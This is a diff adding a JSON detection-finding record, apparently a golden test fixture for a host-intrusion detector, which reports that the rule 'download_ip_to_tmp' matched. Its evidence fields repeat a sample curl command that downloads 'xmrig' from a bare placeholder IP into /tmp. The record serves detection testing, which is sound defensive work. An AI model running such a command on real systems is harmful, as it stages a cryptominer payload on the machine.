@@ -1,0 +1,111 @@
+{
+  "activity_id": 1,
+  "activity_name": "Create",
+  "category_uid": 2,
+  "category_name": "Findings",
+  "class_uid": 2004,
+  "class_name": "Detection Finding",
+  "type_uid": 200401,
+  "type_name": "Detection Finding: Create",
+  "time": 1793448000000,
+  "timezone_offset": 0,
+  "severity_id": 4,
+  "severity": "High",
+  "status_id": 1,
+  "status": "New",
+  "message": "rule \"download_ip_to_tmp\" matched",
+  "metadata": {
+    "version": "1.3.0",
+    "profiles": [
+      "host"
+    ],
+    "product": {
+      "name": "banken",
+      "vendor_name": "conor-sometimes",
+      "version": "test",
+      "url_string": "https://github.com/conor-sometimes/banken"
+    },
+    "uid": "176770fb3847ca8178e5a14b32903e1a",
+    "log_provider": "auditd"
+  },
+  "finding_info": {
+    "uid": "176770fb3847ca8178e5a14b32903e1a",
+    "title": "Download from an IP literal into a temp dir",
+    "desc": "A program ran curl/wget against a bare IP address (not a hostname) writing into /tmp, /dev/shm or /var/tmp. Fetching a payload by IP into a scratch dir is a classic first stage: it skips DNS and any name allow-list, and legitimate automation almost always fetches from a named host. The attempt is the signal whether or not the fetch succeeds.",
+    "analytic": {
+      "type_id": 1,
+      "type": "Rule",
+      "name": "download_ip_to_tmp",
+      "uid": "0a128f0b-b920-46e1-bf78-ff3e4f63cddc"
+    },
+    "attacks": [
+      {
+        "tactic": {
+          "uid": "TA0011",
+          "name": "Command and Control"
+        },
+        "technique": {
+          "uid": "T1105"
+        }
+      }
+    ],
+    "data_sources": [
+      "auditd"
+    ]
+  },
+  "evidences": [
+    {
+      "process": {
+        "pid": 5300,
+        "name": "curl",
+        "cmd_line": "curl -s --max-time 2 http://192.0.2.10/xmrig -o /tmp/xmrig-emul",
+        "file": {
+          "name": "curl",
+          "path": "/usr/bin/curl",
+          "type_id": 1,
+          "type": "Regular File"
+        },
+        "user": {
+          "uid": "1000"
+        },
+        "parent_process": {
+          "pid": 5299
+        }
+      }
+    }
+  ],
+  "device": {
+    "type_id": 0,
+    "type": "Unknown",
+    "hostname": "golden-host"
+  },
+  "observables": [
+    {
+      "type_id": 13,
+      "type": "Command Line",
+      "value": "curl -s --max-time 2 http://192.0.2.10/xmrig -o /tmp/xmrig-emul"
+    },
+    {
+      "type_id": 9,
+      "type": "Process Name",
+      "value": "curl"
+    },
+    {
+      "type_id": 7,
+      "type": "File Name",
+      "value": "/usr/bin/curl"
+    },
+    {
+      "type_id": 1,
+      "type": "Hostname",
+      "value": "golden-host"
+    }
+  ],
+  "raw_data": "{\"time\":\"0001-01-01T00:00:00Z\",\"source\":\"auditd\",\"image\":\"/usr/bin/curl\",\"commandLine\":\"curl -s --max-time 2 http://192.0.2.10/xmrig -o /tmp/xmrig-emul\",\"parentImage\":\"\",\"targetFilename\":\"\",\"user\":\"1000\",\"currentDirectory\":\"/home/u\",\"pid\":5300,\"ppid\":5299}",
+  "unmapped": {
+    "current_directory": "/home/u",
+    "kind": "sigma",
+    "rule": "download_ip_to_tmp",
+    "source": "auditd"
+  }
+}
